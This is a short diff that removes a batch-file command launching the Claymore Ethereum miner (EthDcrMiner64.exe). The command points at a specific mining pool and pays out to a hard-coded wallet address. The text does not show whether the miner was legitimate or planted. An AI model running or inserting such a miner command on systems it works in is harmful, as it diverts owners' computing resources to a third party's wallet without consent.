@@ -1,2 +1,0 @@
-EthDcrMiner64.exe -epool stratum+tcp://eth.pool.zhizhu.top:3867  -ewal 0xdBa4C80E8a1298228D31D822dAe069Fd624D7B16.claymore -epsw x -mode 1 -r 0 -dbg -1 -mport 0 -etha 0 -retrydelay 1 -ftime 55 -tt 79 -ttli 77 -tstop 89 -asm 2 -allpools 1
-pause
